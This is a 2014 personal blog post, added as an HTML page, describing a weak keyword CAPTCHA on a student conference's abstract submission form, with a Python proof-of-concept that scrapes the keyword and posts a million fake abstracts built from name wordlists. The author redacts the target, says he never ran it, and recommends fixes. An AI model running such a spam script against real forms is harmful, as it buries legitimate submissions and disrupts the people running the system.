@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <link href='http://fonts.googleapis.com/css?family=Noticia+Text:400,700' rel='stylesheet' type='text/css' />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="description" content="">
+    <meta name="author" content="Sean Beck">
+
+    <title> Spamming a Submission System | Show Me the Code </title>
+
+    <link rel="stylesheet" href="/theme/css/style.css" type="text/css" />
+    <link rel="stylesheet" href="/theme/css/pygments.css" type="text/css" />
+    <link rel="stylesheet" href="/theme/css/font-awesome.css" type="text/css"/>
+    <link rel="shortcut icon" href="/theme/images/favicon.ico">
+  </head>
+  <body>
+    <div class=container>
+<div class="header">
+    <a href="/index.html">Show Me the Code</a> <span class="muted"></span>
+</div>
+
+<div class=navigation>
+    <ul>
+            <li><a href="/index.html">Blog</a> </li>
+            <li><a href="/archives.html">Archive</a> </li>
+            <li><a href="/tags.html">Tags</a> </li>
+            <li><a href="/about.html">About</a> </li>
+    </ul>
+</div>
+<div class=separator></div>        
+        <div class=body>
+    <h1 class="title"> Spamming a Submission System</h1>
+    <p class=date> Jun 06, 2014 </p>
+    <p>A while back I noticed a gaping security hole in an Abstract submission system for a student conference being held at my school. Since it was local to my school and only its students this really was not a huge risk. However, all it takes is one malicious student, or someone just happening across the system, to ruin scheduling of the entire conference layout. </p>
+<p>The system has the user enter her name, email address, department she is from, her professor/advisor, and her talk's abstract. In order to validate that it is indeed a real request the system also has the word submit a keyword displayed at the bottom of the page. The keyword works like a CAPTCHA (or CRAPTCHA as I like to call them) except it is not as "strong."</p>
+<p>I decided to play with the system and see if the keyword varied. After around ten page refreshes I noticed that it only used about seven different keywords, such as "cougar", "conference", and "spring." I then tried doing a fake submission and inspected the POST data. Everything looked exactly the same as what is displayed on the page, except that a unique number is assigned to each keyword and submitted in the POST. </p>
+<p>The keyword and its number were easily extracted from the page source. After extracting that data all that is required to submit is an abstract and author information. The fake information is easily generated from wordlists containing common first names and last names. </p>
+<p>The page can be fetched for each spam submission, or the page can be fetched once (to make it work a tad faster) and the keyword can be used for each submission. Unfortunately I was not allowed to test the attack code I wrote for fear of being kicked out of school right before finishing my degree. However it is a proof-of-concept and at least demonstrates how the attack would look. </p>
+<p>Below is the attack written in Python. I have removed the target URL as well as the actual post parameters for the keyword and its identifier for the sanity of the people who maintain the system. The system is offline now anyways, but I imagine it will not be fixed by the time it is deployed again next year. The code uses <code>BeautifulSoup</code> and <code>re</code> for determining the keyword information and the beautiful <code>requests</code> module for handling the HTTP requests. It is not beautiful but it demonstrates the concept. It is currently set to submit 1,000,000 fake abstracts. This would be so many fake abstracts that all of the real ones would be buried. The poor developers would have quite a slopfest to deal with. </p>
+<div class="highlight"><pre><span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">randrange</span>
+
+<span class="k">def</span> <span class="nf">get_the_secret</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+    <span class="n">matches</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;\&quot;(.+?)\&quot;&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">matches</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">grab_the_page</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">while</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span>
+
+<span class="k">def</span> <span class="nf">grab_the_word_key</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">word_key</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">&#39;input&#39;</span><span class="p">,</span> <span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s">&#39;name&#39;</span><span class="p">:</span> <span class="s">&#39;word_key&#39;</span><span class="p">})</span>
+    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">word_key</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s">&#39;value&#39;</span><span class="p">]))</span>
+
+<span class="k">def</span> <span class="nf">parse_the_page</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">labels</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">&#39;label&#39;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">label</span> <span class="ow">in</span> <span class="n">labels</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s">&#39;To prove you are a human type&#39;</span> <span class="ow">in</span> <span class="n">label</span><span class="o">.</span><span class="n">contents</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
+            <span class="k">return</span> <span class="n">get_the_secret</span><span class="p">(</span><span class="n">label</span><span class="o">.</span><span class="n">contents</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="s">&#39;http://nomnomredacted.nom&#39;</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="n">grab_the_page</span><span class="p">()</span>
+    <span class="n">word_key</span> <span class="o">=</span> <span class="n">grab_the_word_key</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+    <span class="n">word_value</span> <span class="o">=</span> <span class="n">parse_the_page</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+    <span class="n">dictionary</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;Jargon&#39;</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
+    <span class="n">first_names</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;Given-Names&#39;</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
+    <span class="n">last_names</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;Family-Names&#39;</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
+    <span class="n">num_to_spam</span> <span class="o">=</span> <span class="mi">1000000</span>
+    <span class="n">degree_levels</span> <span class="o">=</span> <span class="p">[</span> <span class="s">&#39;Undergraduate&#39;</span><span class="p">,</span> <span class="s">&#39;Masters&#39;</span><span class="p">,</span> <span class="s">&#39;Doctorate&#39;</span> <span class="p">]</span>
+    <span class="n">advisors_nums</span> <span class="o">=</span> <span class="p">[</span> <span class="s">&#39;169&#39;</span><span class="p">,</span> <span class="s">&#39;171&#39;</span><span class="p">,</span> <span class="s">&#39;g_127&#39;</span><span class="p">,</span> <span class="s">&#39;g_129&#39;</span><span class="p">,</span> <span class="s">&#39;g_132&#39;</span> <span class="p">]</span> <span class="c"># all valid cs teachers</span>
+
+    <span class="c"># sp4m that submission system!</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_to_spam</span><span class="p">):</span>
+        <span class="n">first_name</span> <span class="o">=</span> <span class="n">first_names</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="n">last_name</span> <span class="o">=</span> <span class="n">last_names</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="n">email</span> <span class="o">=</span> <span class="n">first_name</span><span class="o">+</span><span class="n">last_name</span><span class="o">+</span><span class="s">&#39;@gmail.com&#39;</span>
+        <span class="n">degree_level</span> <span class="o">=</span> <span class="n">degree_levels</span><span class="p">[</span><span class="n">randrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">degree_levels</span><span class="p">))]</span>
+        <span class="n">department</span> <span class="o">=</span> <span class="s">&#39;2&#39;</span> <span class="c"># this is the code for computer science</span>
+        <span class="n">faculty_advisor</span> <span class="o">=</span> <span class="n">advisors_nums</span><span class="p">[</span><span class="n">randrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">advisors_nums</span><span class="p">))]</span>
+        <span class="n">abstract_title</span> <span class="o">=</span> <span class="n">dictionary</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="n">abstract</span> <span class="o">=</span> <span class="n">first_name</span><span class="o">+</span><span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">last_name</span><span class="o">+</span><span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">email</span><span class="o">+</span><span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">degree_level</span><span class="o">+</span><span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">department</span><span class="o">+</span><span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">faculty_advisor</span><span class="o">+</span><span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">abstract_title</span>
+        <span class="n">abstract</span> <span class="o">+=</span> <span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">abstract</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&#39;first_name&#39;</span><span class="p">:</span> <span class="n">first_name</span><span class="p">,</span> 
+                <span class="s">&#39;last_name&#39;</span><span class="p">:</span> <span class="n">last_name</span><span class="p">,</span>
+                <span class="s">&#39;email&#39;</span><span class="p">:</span> <span class="n">email</span><span class="p">,</span>
+                <span class="s">&#39;degree_level&#39;</span><span class="p">:</span> <span class="n">degree_level</span><span class="p">,</span>
+                <span class="s">&#39;department&#39;</span><span class="p">:</span> <span class="n">department</span><span class="p">,</span>
+                <span class="s">&#39;faculty_advisor&#39;</span><span class="p">:</span> <span class="n">faculty_advisor</span><span class="p">,</span>
+                <span class="s">&#39;abstract_title&#39;</span><span class="p">:</span> <span class="n">abstract_title</span><span class="p">,</span>
+                <span class="s">&#39;abstract&#39;</span><span class="p">:</span> <span class="n">abstract</span><span class="p">,</span>
+                <span class="s">&#39;submit&#39;</span><span class="p">:</span> <span class="s">&#39;Submit&#39;</span><span class="p">,</span>
+                <span class="s">&#39;num&#39;</span><span class="p">:</span> <span class="n">word_key</span><span class="p">,</span>
+                <span class="s">&#39;key&#39;</span><span class="p">:</span> <span class="n">word_value</span>
+                <span class="p">}</span>
+        <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">print</span> <span class="s">&#39;Finished spamming the submission system&#39;</span>
+</pre></div>
+
+
+<p>Even a normal CAPTCHA would be better than the level of security in place on the system. However since students at the school are the only ones allowed to present at the conference, users should be required to login with their school credentials in order to submit. This way only a legitimate student could carry out the attack, but the attack would be tied to his name. </p>
+<p>While the risk of attack is low from students participating in the conference, there is still a risk. Security should still be a priority, especially with systems like these. If this attack were carried out the conference would more than likely be ruined. It would take a large amount of work for the developers to remove all of the spam abstracts without removing any legitimate ones. </p>
+    
+<div class=twitter>
+<a href="https://twitter.com/share" class="twitter-share-button">Tweet</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+</div>
+    <p class=tags>This entry was tagged as
+      <a href="/tag/python.html">python</a>
+      <a href="/tag/security.html">security</a>
+    </p>
+        </div>
+        
+<div class=footer>
+  <p>&copy; Copyright <script language="JavaScript">var date = new Date(); document.write(date.getFullYear());</script> by Sean Beck</p>
+  <p> Powered by <a href="http://pypi.python.org/pypi/pelican/" target="_blank">Pelican</a>.  
+    <a href="https://github.com/fjavieralba/flasky">Theme</a>  by <a href="http://fjavieralba.com">fjavieralba</a>
+  </p> 
+  <p>
+    <div class=social style="font-size: 27px;">
+      <ul>
+<script language="JavaScript">
+          u = 'seanmckaybeck';
+          s = 'gmail.com';
+          document.write('<a href=\"mailto:' + u + '@' + s + '\" target=\"_blank\">');
+        </script>
+            <li><i class="icon-envelope icon-large"></i> </li>
+        </a><a href="http://twitter.com/seanmckaybeck" target="_blank"> <li> <i class="icon-twitter-sign icon-large"> </li></i> </a><a href="https://www.linkedin.com/in/seanmckaybeck" target="_blank"><li><i class="icon-linkedin-sign icon-large" ></i></li></a><a href="https://github.com/ThaWeatherman" target="_blank"> <li> <i class="icon-github-sign icon-large"></i> </li> </a>
+
+        <a href="https://seanmckaybeck.com/feeds/all.rss.xml" rel="alternate" title="Recent Blog Posts"><li> <i class="icon-rss icon-large"></i> </li></a>
+      </ul>
+    </div>
+  </p>
+</div>    </div>
+  </body>
+</html>
